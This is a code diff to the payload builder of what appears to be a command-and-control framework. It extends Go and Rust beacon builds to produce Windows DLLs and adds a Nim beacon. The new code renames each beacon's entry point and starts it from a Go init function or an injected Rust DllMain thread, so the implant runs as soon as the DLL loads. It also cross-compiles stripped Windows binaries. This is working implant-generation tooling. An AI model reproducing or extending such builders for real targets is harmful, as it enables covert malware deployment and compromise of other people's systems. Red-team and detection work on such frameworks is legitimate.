@@ -633,9 +633,9 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 			_ = os.RemoveAll(tempDir)
 			return nil, "", errors.New("Go beacon only supports HTTP protocol")
 		}
-		if generateConfig.Format != "Exe" {
+		if generateConfig.Format != "Exe" && generateConfig.Format != "DLL" {
 			_ = os.RemoveAll(tempDir)
-			return nil, "", errors.New("Go beacon only supports Exe format")
+			return nil, "", errors.New("Go beacon supports Exe and DLL formats")
 		}
 
 		_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Building Go beacon...")
@@ -649,52 +649,122 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 			}
 			goProfileBytes += "0x" + string(agentProfile[i+2:i+4])
 		}
-		config := fmt.Sprintf("package main\n\nvar profileData = []byte{%s}\nvar profileSize = %d\n", goProfileBytes, agentProfileSize)
-		configPath := goSrcDir + "/config.go"
-		err = os.WriteFile(configPath, []byte(config), 0644)
-		if err != nil {
-			_ = os.RemoveAll(tempDir)
-			return nil, "", err
-		}
 
 		GoArch := "amd64"
+		GoCC := "x86_64-w64-mingw32-gcc"
 		if generateConfig.Arch == "x86" {
 			GoArch = "386"
+			GoCC = "i686-w64-mingw32-gcc"
 		}
 
-		Filename = "agent.exe"
-		buildPath := tempDir + "/agent.exe"
-		LdFlags := "-s -w -H=windowsgui"
-		cmdBuild := fmt.Sprintf("GOWORK=off CGO_ENABLED=0 GOOS=windows GOARCH=%s go build -trimpath -ldflags=\"%s\" -o %s", GoArch, LdFlags, buildPath)
+		if generateConfig.Format == "DLL" {
+			tmpGoDir := tempDir + "/go_build"
+			err = os.MkdirAll(tmpGoDir, 0755)
+			if err != nil {
+				_ = os.RemoveAll(tempDir)
+				return nil, "", err
+			}
 
-		_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Target: windows/%s", GoArch))
-		_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Starting build process...")
-		var buildArgs []string
-		buildArgs = append(buildArgs, "-c", cmdBuild)
-		err = Ts.TsAgentBuildExecute(profile.BuilderId, goSrcDir, "sh", buildArgs...)
-		if err != nil {
+			goModContent, err := os.ReadFile(goSrcDir + "/go.mod")
+			if err != nil {
+				_ = os.RemoveAll(tempDir)
+				return nil, "", err
+			}
+			err = os.WriteFile(tmpGoDir+"/go.mod", goModContent, 0644)
+			if err != nil {
+				_ = os.RemoveAll(tempDir)
+				return nil, "", err
+			}
+
+			goConfig := fmt.Sprintf("package main\n\nvar profileData = []byte{%s}\nvar profileSize = %d\n", goProfileBytes, agentProfileSize)
+			err = os.WriteFile(tmpGoDir+"/config.go", []byte(goConfig), 0644)
+			if err != nil {
+				_ = os.RemoveAll(tempDir)
+				return nil, "", err
+			}
+
+			mainContent, err := os.ReadFile(goSrcDir + "/main.go")
+			if err != nil {
+				_ = os.RemoveAll(tempDir)
+				return nil, "", err
+			}
+			modifiedMain := strings.Replace(string(mainContent), "func main() {", "func beaconMain() {", 1)
+			err = os.WriteFile(tmpGoDir+"/main.go", []byte(modifiedMain), 0644)
+			if err != nil {
+				_ = os.RemoveAll(tempDir)
+				return nil, "", err
+			}
+
+			dllEntry := "package main\n\nimport \"C\"\n\nfunc init() {\n\tgo beaconMain()\n}\n"
+			err = os.WriteFile(tmpGoDir+"/dll_entry.go", []byte(dllEntry), 0644)
+			if err != nil {
+				_ = os.RemoveAll(tempDir)
+				return nil, "", err
+			}
+
+			Filename = "agent.dll"
+			buildPath := tempDir + "/agent.dll"
+			cmdBuild := fmt.Sprintf("GOWORK=off CGO_ENABLED=1 CC=%s GOOS=windows GOARCH=%s go build -buildmode=c-shared -trimpath -ldflags=\"-s -w\" -o %s", GoCC, GoArch, buildPath)
+
+			_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Target: windows/%s (DLL)", GoArch))
+			_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Starting build process...")
+			var buildArgs []string
+			buildArgs = append(buildArgs, "-c", cmdBuild)
+			err = Ts.TsAgentBuildExecute(profile.BuilderId, tmpGoDir, "sh", buildArgs...)
+			if err != nil {
+				_ = os.RemoveAll(tempDir)
+				return nil, "", err
+			}
+
+			Payload, err = os.ReadFile(buildPath)
+			if err != nil {
+				_ = os.RemoveAll(tempDir)
+				return nil, "", err
+			}
 			_ = os.RemoveAll(tempDir)
+		} else {
+			config := fmt.Sprintf("package main\n\nvar profileData = []byte{%s}\nvar profileSize = %d\n", goProfileBytes, agentProfileSize)
+			configPath := goSrcDir + "/config.go"
+			err = os.WriteFile(configPath, []byte(config), 0644)
+			if err != nil {
+				_ = os.RemoveAll(tempDir)
+				return nil, "", err
+			}
+
+			Filename = "agent.exe"
+			buildPath := tempDir + "/agent.exe"
+			LdFlags := "-s -w -H=windowsgui"
+			cmdBuild := fmt.Sprintf("GOWORK=off CGO_ENABLED=0 GOOS=windows GOARCH=%s go build -trimpath -ldflags=\"%s\" -o %s", GoArch, LdFlags, buildPath)
+
+			_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Target: windows/%s", GoArch))
+			_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Starting build process...")
+			var buildArgs []string
+			buildArgs = append(buildArgs, "-c", cmdBuild)
+			err = Ts.TsAgentBuildExecute(profile.BuilderId, goSrcDir, "sh", buildArgs...)
+			if err != nil {
+				_ = os.RemoveAll(tempDir)
+				_ = os.WriteFile(configPath, []byte("package main\n\nvar profileData = []byte{}\nvar profileSize = 0\n"), 0644)
+				return nil, "", err
+			}
+
 			_ = os.WriteFile(configPath, []byte("package main\n\nvar profileData = []byte{}\nvar profileSize = 0\n"), 0644)
-			return nil, "", err
-		}
 
-		_ = os.WriteFile(configPath, []byte("package main\n\nvar profileData = []byte{}\nvar profileSize = 0\n"), 0644)
-
-		Payload, err = os.ReadFile(buildPath)
-		if err != nil {
+			Payload, err = os.ReadFile(buildPath)
+			if err != nil {
+				_ = os.RemoveAll(tempDir)
+				return nil, "", err
+			}
 			_ = os.RemoveAll(tempDir)
-			return nil, "", err
 		}
-		_ = os.RemoveAll(tempDir)
 
 	case "Rust":
 		if protocol != "http" {
 			_ = os.RemoveAll(tempDir)
 			return nil, "", errors.New("Rust beacon only supports HTTP protocol")
 		}
-		if generateConfig.Format != "Exe" {
+		if generateConfig.Format != "Exe" && generateConfig.Format != "DLL" {
 			_ = os.RemoveAll(tempDir)
-			return nil, "", errors.New("Rust beacon only supports Exe format")
+			return nil, "", errors.New("Rust beacon only supports Exe and DLL formats")
 		}
 
 		_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Building Rust beacon...")
@@ -719,40 +789,166 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 			_ = os.RemoveAll(tempDir)
 			return nil, "", err
 		}
-		err = os.WriteFile(tmpRustDir+"/Cargo.toml", cargoContent, 0644)
-		if err != nil {
-			_ = os.RemoveAll(tempDir)
-			return nil, "", err
-		}
 
 		rsCode := string(mainRsContent)
 		rsCode = strings.Replace(rsCode, "PROFILE_PLACEHOLDER", profileBytesComma, 1)
 		rsCode = strings.Replace(rsCode, "PROFILE_SIZE_PLACEHOLDER", fmt.Sprintf("%d", agentProfileSize), 1)
-		err = os.WriteFile(tmpRustDir+"/src/main.rs", []byte(rsCode), 0644)
-		if err != nil {
-			_ = os.RemoveAll(tempDir)
-			return nil, "", err
-		}
 
 		rustTarget := "x86_64-pc-windows-gnu"
 		if generateConfig.Arch == "x86" {
 			rustTarget = "i686-pc-windows-gnu"
 		}
 
-		Filename = "agent.exe"
-		cmdBuild := fmt.Sprintf("cargo build --release --target %s", rustTarget)
+		if generateConfig.Format == "DLL" {
+			rsCode = strings.Replace(rsCode, "fn main() {", "fn beacon_main() {", 1)
 
-		_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Target: %s", rustTarget))
-		_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Starting build process...")
-		var buildArgs []string
-		buildArgs = append(buildArgs, "-c", cmdBuild)
-		err = Ts.TsAgentBuildExecute(profile.BuilderId, tmpRustDir, "sh", buildArgs...)
+			dllMain := "use std::thread;\n\n" +
+				"type HINSTANCE = *mut u8;\n" +
+				"type DWORD = u32;\n" +
+				"type LPVOID = *mut u8;\n" +
+				"type BOOL = i32;\n\n" +
+				"const DLL_PROCESS_ATTACH: DWORD = 1;\n\n" +
+				"#[no_mangle]\n" +
+				"pub extern \"system\" fn DllMain(_hinst: HINSTANCE, reason: DWORD, _reserved: LPVOID) -> BOOL {\n" +
+				"    if reason == DLL_PROCESS_ATTACH {\n" +
+				"        thread::spawn(|| { beacon_main(); });\n" +
+				"    }\n" +
+				"    1\n" +
+				"}\n\n"
+			rsCode = dllMain + rsCode
+
+			err = os.WriteFile(tmpRustDir+"/src/lib.rs", []byte(rsCode), 0644)
+			if err != nil {
+				_ = os.RemoveAll(tempDir)
+				return nil, "", err
+			}
+
+			cargoStr := string(cargoContent) + "\n[lib]\ncrate-type = [\"cdylib\"]\npath = \"src/lib.rs\"\n"
+			err = os.WriteFile(tmpRustDir+"/Cargo.toml", []byte(cargoStr), 0644)
+			if err != nil {
+				_ = os.RemoveAll(tempDir)
+				return nil, "", err
+			}
+
+			Filename = "agent.dll"
+			cmdBuild := fmt.Sprintf("cargo build --release --target %s", rustTarget)
+
+			_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Target: %s (DLL)", rustTarget))
+			_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Starting build process...")
+			var buildArgs []string
+			buildArgs = append(buildArgs, "-c", cmdBuild)
+			err = Ts.TsAgentBuildExecute(profile.BuilderId, tmpRustDir, "sh", buildArgs...)
+			if err != nil {
+				_ = os.RemoveAll(tempDir)
+				return nil, "", err
+			}
+
+			buildPath := tmpRustDir + "/target/" + rustTarget + "/release/beacon.dll"
+			Payload, err = os.ReadFile(buildPath)
+			if err != nil {
+				_ = os.RemoveAll(tempDir)
+				return nil, "", err
+			}
+			_ = os.RemoveAll(tempDir)
+		} else {
+			err = os.WriteFile(tmpRustDir+"/Cargo.toml", cargoContent, 0644)
+			if err != nil {
+				_ = os.RemoveAll(tempDir)
+				return nil, "", err
+			}
+
+			err = os.WriteFile(tmpRustDir+"/src/main.rs", []byte(rsCode), 0644)
+			if err != nil {
+				_ = os.RemoveAll(tempDir)
+				return nil, "", err
+			}
+
+			Filename = "agent.exe"
+			cmdBuild := fmt.Sprintf("cargo build --release --target %s", rustTarget)
+
+			_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Target: %s", rustTarget))
+			_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Starting build process...")
+			var buildArgs []string
+			buildArgs = append(buildArgs, "-c", cmdBuild)
+			err = Ts.TsAgentBuildExecute(profile.BuilderId, tmpRustDir, "sh", buildArgs...)
+			if err != nil {
+				_ = os.RemoveAll(tempDir)
+				return nil, "", err
+			}
+
+			buildPath := tmpRustDir + "/target/" + rustTarget + "/release/beacon.exe"
+			Payload, err = os.ReadFile(buildPath)
+			if err != nil {
+				_ = os.RemoveAll(tempDir)
+				return nil, "", err
+			}
+			_ = os.RemoveAll(tempDir)
+		}
+
+	case "Nim":
+		if protocol != "http" {
+			_ = os.RemoveAll(tempDir)
+			return nil, "", errors.New("Nim beacon only supports HTTP protocol")
+		}
+		if generateConfig.Format != "Exe" && generateConfig.Format != "DLL" {
+			_ = os.RemoveAll(tempDir)
+			return nil, "", errors.New("Nim beacon only supports Exe and DLL formats")
+		}
+
+		_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Building Nim beacon...")
+
+		nimSrcDir := currentDir + "/src_beacon_nim"
+		nimSrcPath := nimSrcDir + "/beacon.nim"
+		nimContent, err := os.ReadFile(nimSrcPath)
+		if err != nil {
+			_ = os.RemoveAll(tempDir)
+			return nil, "", fmt.Errorf("failed to read Nim source: %v", err)
+		}
+
+		tmpNimDir := tempDir + "/nim_build"
+		err = os.MkdirAll(tmpNimDir, 0755)
 		if err != nil {
 			_ = os.RemoveAll(tempDir)
 			return nil, "", err
 		}
 
-		buildPath := tmpRustDir + "/target/" + rustTarget + "/release/beacon.exe"
+		nimCode := string(nimContent)
+		nimCode = strings.Replace(nimCode, "PROFILE_PLACEHOLDER", profileBytesComma, 1)
+		nimCode = strings.Replace(nimCode, "PROFILE_SIZE_PLACEHOLDER", fmt.Sprintf("%d", agentProfileSize), 1)
+
+		err = os.WriteFile(tmpNimDir+"/beacon.nim", []byte(nimCode), 0644)
+		if err != nil {
+			_ = os.RemoveAll(tempDir)
+			return nil, "", err
+		}
+
+		nimCpu := "amd64"
+		if generateConfig.Arch == "x86" {
+			nimCpu = "i386"
+		}
+
+		nimApp := "console"
+		if generateConfig.Format == "DLL" {
+			nimApp = "lib"
+			Filename = "agent.dll"
+		} else {
+			Filename = "agent.exe"
+		}
+
+		buildPath := tempDir + "/" + Filename
+		cmdBuild := fmt.Sprintf("nim c --os:windows --cpu:%s -d:mingw -d:release --opt:size --app:%s -o:%s %s/beacon.nim",
+			nimCpu, nimApp, buildPath, tmpNimDir)
+
+		_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Target: windows/%s (%s)", nimCpu, strings.ToUpper(generateConfig.Format)))
+		_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Starting build process...")
+		var buildArgs []string
+		buildArgs = append(buildArgs, "-c", cmdBuild)
+		err = Ts.TsAgentBuildExecute(profile.BuilderId, tmpNimDir, "sh", buildArgs...)
+		if err != nil {
+			_ = os.RemoveAll(tempDir)
+			return nil, "", err
+		}
+
 		Payload, err = os.ReadFile(buildPath)
 		if err != nil {
 			_ = os.RemoveAll(tempDir)
